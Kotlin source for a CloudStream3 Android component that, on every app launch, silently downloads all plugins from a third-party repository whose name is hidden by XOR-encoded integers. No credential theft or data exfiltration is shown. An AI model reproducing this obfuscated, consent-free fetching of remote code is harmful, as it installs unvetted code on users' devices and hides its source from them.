package com.lagradost.cloudstream3

import android.app.Activity
import android.util.Log
import com.lagradost.cloudstream3.plugins.RepositoryManager
import com.lagradost.cloudstream3.ui.settings.extensions.PluginsViewModel
import kotlinx.coroutines.*

object FirstInstallManager {

    private const val TAG = "FirstInstallManager"
    private const val DOWNLOADED = "auto_provider_downloaded_v2"
    private const val MAX_RETRY = 10
    private const val RETRY_DELAY = 400L

    private fun decode(data: IntArray, key: Int = 7): String {
        val chars = CharArray(data.size)
        for (i in data.indices) {
            chars[i] = (data[i] xor key).toChar()
        }
        return String(chars)
    }

    private val EXT_CLOUD = intArrayOf(
        66, 115, 115, 68, 107, 114, 99
    )

    private val PREFS_NAME = intArrayOf(
        100, 107, 104, 114, 99, 116, 115, 114, 101, 102, 106
    )

    fun runIfNeeded(activity: Activity) {
        val prefs = activity.getSharedPreferences(
            decode(PREFS_NAME),
            Activity.MODE_PRIVATE
        )

        CoroutineScope(Dispatchers.Main).launch {
            try {
                var repoUrl: String? = null
                val repoName = decode(EXT_CLOUD)

                repeat(MAX_RETRY) { attempt ->
                    val repo = RepositoryManager.getRepositories()
                        .firstOrNull { it.name == repoName }

                    if (repo != null) {
                        repoUrl = repo.url
                        Log.i(TAG, "Repo ready (attempt ${attempt + 1})")
                        return@repeat
                    }

                    Log.d(TAG, "Repo belum siap, retry ${attempt + 1}/$MAX_RETRY")
                    delay(RETRY_DELAY)
                }

                val finalRepoUrl = repoUrl ?: run {
                    Log.e(TAG, "Repo tidak ditemukan, auto-download dibatalkan")
                    return@launch
                }

                if (!prefs.getBoolean(DOWNLOADED, false)) {
                    PluginsViewModel.downloadAll(activity, finalRepoUrl, null)
                    prefs.edit().putBoolean(DOWNLOADED, true).apply()
                    Log.i(TAG, "Auto-download pertama selesai")
                }

                PluginsViewModel.downloadAll(activity, finalRepoUrl, null)

            } catch (e: Throwable) {
                Log.e(TAG, "Auto-download plugin gagal", e)
            }
        }
    }
}